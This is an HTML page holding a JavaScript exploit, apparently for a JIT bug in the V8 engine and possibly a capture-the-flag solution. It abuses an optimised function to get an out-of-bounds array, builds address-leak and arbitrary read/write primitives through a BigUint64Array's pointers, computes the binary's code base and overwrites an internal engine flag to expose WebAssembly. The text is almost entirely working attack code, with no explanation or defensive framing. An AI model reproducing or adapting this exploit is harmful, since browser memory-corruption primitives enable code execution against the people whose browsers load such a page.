<body>
<script>

function console(msg){
	document.body.innerText += msg + '\n';
}
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Uint32Array(buf);

function f2i(f)
{
	float64[0] = f;
	return bigUint64[0]; 
}

function i2f(i)
{
	bigUint64[0] = i;
	return float64[0];
}

function f2half(val)
{
	float64[0] = val;
	let tmp = Array.from(Uint32);
	return tmp;
}

function half2f(val)
{
	Uint32.set(val);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

function ByteToBigIntArray(payload)
{

    let sc = []
    let tmp = 0n;
    let lenInt = BigInt(Math.floor(payload.length/8))
    for (let i = 0n; i < lenInt; i += 1n) {
        tmp = 0n;
        for(let j=0n; j<8n; j++){
            tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
        }
        sc.push(tmp);
    }

    let len = payload.length%8;
    tmp = 0n;
    for(let i=0n; i<len; i++){
        tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
    }
    sc.push(tmp);
    return sc;
}

function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

function foo(a, b) {
	let tmp = {};
	b[0] = 0;
	a.length;
	for(let i = 0; i < a.length; i++){
		a[i] = tmp;
	}
	let o = [1.1];
	b[15] = 4.063e-320;
	return o;
}

var arr_addr_of = new Array(1);
arr_addr_of[0] = 'a';
for(let i = 0; i < 10000; i++) {
	eval(`var tmp_arr = [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24];`);
	foo(arr_addr_of, [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]);
	foo(tmp_arr, [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]);
}

gc();

var float_arr = [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24];
var oob_array = foo(float_arr, float_arr, {});

var obj_array = {mark: 0xdead, obj: arr_addr_of};
var big_array = new BigUint64Array(6);
big_array[0] = 0x1234n;
big_array[1] = 0xaabbn;

console("[+] oob_array length: " + hex(oob_array.length));

var obj_idx = 0;
for(let i = 0; i < 0x500; i++)
{
	let tmp = f2half(oob_array[i]);
	if(tmp[1] == (0xdead << 1)){
		obj_idx = i+1;
		break;
	}
}

console("[+] obj_idx: 0x"+ hex(obj_idx));

var external_pointer_idx = 0;
var base_pointer_idx = 0;
var bigarray_len_idx = 0;

for(let i=0; i < 0x500; i++)
{
	if(f2i(oob_array[i]) == 0x1234n){
		bigarray_len_idx = i + 10;
		console("[+] find bigarray length : 0x" + hex(f2i(oob_array[bigarray_len_idx])));
		external_pointer_idx = i + 11;
		external_pointer = f2i(oob_array[external_pointer_idx]);
		console("[+] find external_pointer : 0x" + hex(external_pointer));
		base_pointer_idx = i + 12;
		base_pointer = f2i(oob_array[base_pointer_idx]);
		console("[+] find base_pointer : 0x" + hex(base_pointer));
		break;
	}
}

var highaddr = f2i(oob_array[external_pointer_idx]) & 0xffffffff00000000n;
console("[+] highaddr : 0x" + hex(highaddr));

function heap_read(addr)
{
	oob_array[base_pointer_idx] = i2f(addr-0x8n);
	let ret = big_array[0];
	return ret;
}

function arb_read(addr)
{
	oob_array[base_pointer_idx] = i2f(0n);
	oob_array[external_pointer_idx] = i2f(addr);
	let ret = big_array[0];
        return ret;

}

function arb_write(addr, payload)
{
	sc = ByteToBigIntArray(payload);
	oob_array[bigarray_len_idx] = i2f(BigInt(sc.length));
	oob_array[base_pointer_idx] = i2f(0n);
	oob_array[external_pointer_idx] = i2f(addr);

	for(let i = 0; i < sc.length; i++) {
        	big_array[i] = sc[i];
   	}
}

function arb_write64(addr, payload)
{
	oob_array[base_pointer_idx] = i2f(0n);
	oob_array[external_pointer_idx] = i2f(addr);
        big_array[0] = payload;
}

function addr_of(obj)
{
	obj_array.obj = obj;
	let addr = f2half(oob_array[obj_idx]);
	let obj_addr = addr[0];
	return BigInt(obj_addr);
}

var arr = [1.1, 2.2, 3.3];
var arr_addr = addr_of(arr.constructor);
console("[+] arr_addr constructor: 0x" + hex(arr_addr));
var constructor_code = heap_read(arr_addr + 0x18n) & (0xffffffffn);
console("[+] constructor_code : 0x" + hex(constructor_code));

var code_text_addr = heap_read(constructor_code + 0x40n) >> 16n;
console("[+] code_text_addr : 0x" + hex(code_text_addr));

var text_base = code_text_addr - 0x3e9dc0n;
console("[+] text_base : 0x" + hex(text_base));

var FLAG_expose_wasm = text_base + 0xeed418n;
console("[+] FLAG_expose_wasm : 0x" + hex(FLAG_expose_wasm));

arb_write64(FLAG_expose_wasm, 0x1n);

</script>
</body>
